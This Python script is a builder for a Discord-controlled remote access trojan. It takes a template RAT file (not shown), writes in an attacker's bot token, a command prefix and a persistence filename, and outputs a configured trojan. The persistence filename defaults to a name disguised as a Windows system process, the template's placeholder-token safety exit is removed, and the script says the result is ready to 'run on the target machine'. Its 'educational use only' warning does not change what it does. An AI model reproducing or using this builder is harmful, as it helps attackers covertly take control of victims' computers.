import os
import sys
import shutil # Optional: for potentially copying template.py first

# --- Configuration ---
RAT_SOURCE_FILE = "template.py"

# --- Helper Functions ---
def prompt_user(prompt_text: str, default_value: str = "") -> str:
    """Prompts the user for input with an optional default."""
    full_prompt = f"{prompt_text}"
    if default_value:
        full_prompt += f" [Default: {default_value}]: "
    else:
        full_prompt += ": "

    user_input = input(full_prompt).strip()
    return user_input if user_input else default_value

def validate_filename(filename: str) -> bool:
    """Basic check for valid Python filename."""
    if not filename:
        return False
    if not filename.endswith(".py"):
        print("Error: Output filename must end with '.py'")
        return False
    # Basic check for invalid characters (you might want a more robust check)
    invalid_chars = '<>:"/\\|?*'
    if any(char in filename for char in invalid_chars):
        print(f"Error: Filename contains invalid characters ({invalid_chars})")
        return False
    return True

def build_rat(token: str, prefix: str, persistence_filename: str, output_filename: str):
    """Reads the source RAT, injects config, and writes the new file."""
    print("-" * 30)
    print(f"[*] Reading source file: {RAT_SOURCE_FILE}")

    if not os.path.exists(RAT_SOURCE_FILE):
        print(f"\n[FATAL ERROR] Source RAT file '{RAT_SOURCE_FILE}' not found!")
        print("Please ensure 'template.py' is in the same directory as this builder.")
        sys.exit(1)

    new_rat_content = []
    try:
        with open(RAT_SOURCE_FILE, 'r', encoding='utf-8') as f_source:
            for line in f_source:
                stripped_line = line.strip()
                # --- Replace configuration lines ---
                if stripped_line.startswith("TOKEN: str ="):
                    # Preserve indentation + add user token
                    indent = line[:line.find("TOKEN: str =")]
                    new_line = f"{indent}TOKEN: str = '{token}' # Injected by builder\n"
                    new_rat_content.append(new_line)
                    print(f"[*] Injected TOKEN")
                elif stripped_line.startswith("PREFIX: str ="):
                    indent = line[:line.find("PREFIX: str =")]
                    new_line = f"{indent}PREFIX: str = '{prefix}' # Injected by builder\n"
                    new_rat_content.append(new_line)
                    print(f"[*] Injected PREFIX")
                elif stripped_line.startswith("DEFAULT_PERSISTENCE_FILENAME: str ="):
                    indent = line[:line.find("DEFAULT_PERSISTENCE_FILENAME: str =")]
                    new_line = f"{indent}DEFAULT_PERSISTENCE_FILENAME: str = '{persistence_filename}' # Injected by builder\n"
                    new_rat_content.append(new_line)
                    print(f"[*] Injected DEFAULT_PERSISTENCE_FILENAME")
                # --- IMPORTANT: Remove placeholder warning if present ---
                elif "Using the default placeholder TOKEN." in line and token != 'ENTER_TOKEN_HERE':
                    print("[*] Skipping default token warning line.")
                    continue # Skip the print and sys.exit related to the default token
                elif "sys.exit(1) # Exit if token is invalid/missing" in line and token != 'ENTER_TOKEN_HERE':
                    print("[*] Skipping default token sys.exit(1) line.")
                    continue # Skip the sys.exit line too
                else:
                    # --- Keep other lines as they are ---
                    new_rat_content.append(line)

        print(f"\n[*] Writing configured RAT to: {output_filename}")
        with open(output_filename, 'w', encoding='utf-8') as f_out:
            f_out.writelines(new_rat_content)

        print(f"\n[SUCCESS] Successfully built '{output_filename}'!")
        print("You can now transfer and run this file on the target machine.")
        print("Remember the ethical and legal warnings associated with this tool.")

    except IOError as e:
        print(f"\n[ERROR] File operation failed: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"\n[ERROR] An unexpected error occurred during build: {e}")
        sys.exit(1)


# --- Main Builder Logic ---
if __name__ == "__main__":
    print("=============================================")
    print("   Advanced Discord RAT Builder (for template.py)")
    print("=============================================")
    print("\n⚠️ WARNING: This tool builds software intended for")
    print("   educational/ethical research ONLY. Unauthorized use")
    print("   is ILLEGAL and UNETHICAL. Use responsibly.\n")

    # --- Gather Configuration ---
    token = ""
    while not token:
        token = prompt_user("Enter the Discord Bot Token (REQUIRED)")
        if not token or len(token) < 50: # Basic check
            print("Error: Discord Token seems invalid. Please paste the full token.")
            token = ""

    prefix = prompt_user("Enter the command prefix", default_value="/")

    persist_filename = ""
    while not persist_filename:
        persist_filename = prompt_user("Enter persistence filename (e.g., runtime_svc.exe)",
                                       default_value="svchost_runtime.exe")
        # Add more robust validation if needed (e.g., allowed chars, extension)
        if not persist_filename.lower().endswith(".exe"):
            print("Warning: It's recommended to use a '.exe' extension for persistence filename.")
            confirm_non_exe = input("Continue with this filename? (y/n): ").lower()
            if confirm_non_exe != 'y':
                persist_filename = "" # Ask again


    output_filename = ""
    while not validate_filename(output_filename):
         output_filename = prompt_user("Enter the desired output filename (e.g., configured_rat.py)",
                                      default_value="generated_rat.py")


    # --- Confirm Settings ---
    print("\n--- Configuration Summary ---")
    print(f"Discord Token:       ...{token[-6:]}") # Show only last 6 chars for privacy
    print(f"Command Prefix:      {prefix}")
    print(f"Persistence Filename:{persist_filename}")
    print(f"Output File:         {output_filename}")
    print("-" * 27)

    confirm = input("Proceed with building? (y/n): ").lower()

    if confirm == 'y':
        build_rat(token, prefix, persist_filename, output_filename)
    else:
        print("\nBuild cancelled by user.")
        sys.exit(0)
